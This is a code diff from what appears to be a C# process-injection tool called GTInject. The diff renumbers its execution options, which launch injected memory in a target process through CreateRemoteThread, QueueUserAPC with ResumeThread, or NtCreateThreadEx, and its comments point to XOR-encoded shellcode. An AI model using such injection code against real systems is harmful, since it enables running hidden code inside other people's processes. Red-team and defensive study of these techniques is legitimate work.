@@ -11,23 +11,23 @@ namespace GTInject.Injection
         {
             switch (execoption)
             {
-                case 1:
-                    return execopt1(memaddr, pid, tid);
-                case 2:
-                    return execopt2(memaddr, pid, tid);
-                case 3:
-                    return execopt3(memaddr, pid, tid);
+                case 100:
+                    return execopt100(memaddr, pid, tid);
+                case 101:
+                    return execopt101(memaddr, pid, tid);
+                case 200:
+                    return execopt200(memaddr, pid, tid);
                 case 4:
                     return IntPtr.Zero;
             }
             return IntPtr.Zero;
         }
 
-        private static IntPtr execopt1(IntPtr memaddr, Process ProcID, int ThreadID)
+        private static IntPtr execopt100(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             // //  GTInject.exe inject memoryOption execOption xorkey binSrcType binSourcePath PID TID
             /////////////////////////////////////
-            // OPTION 1 == CreateRemoteThread (WINAPI)
+            // OPTION 100 == CreateRemoteThread (WINAPI)
             /////////////////////////////////////
             
             IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
@@ -35,10 +35,10 @@ namespace GTInject.Injection
             return remoteThreadResp;
         }
 
-        private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID)
+        private static IntPtr execopt101(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
-            // OPTION 2 == QueueUserAPC & ResumeThread (WINAPI)
+            // OPTION 101 == QueueUserAPC & ResumeThread (WINAPI)
             /////////////////////////////////////
             Console.WriteLine( " Thread exec with WINAPI Q User APC and Resume Thread");
             //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
@@ -76,10 +76,10 @@ namespace GTInject.Injection
 
         }
 
-        private static IntPtr execopt3(IntPtr memaddr, Process ProcID, int ThreadID)
+        private static IntPtr execopt200(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
-            // OPTION 3 == NtCreateThreadEx (NTAPI)
+            // OPTION 200 == NtCreateThreadEx (NTAPI)
             /////////////////////////////////////
             ///
             //Create a remote thread and execute it.
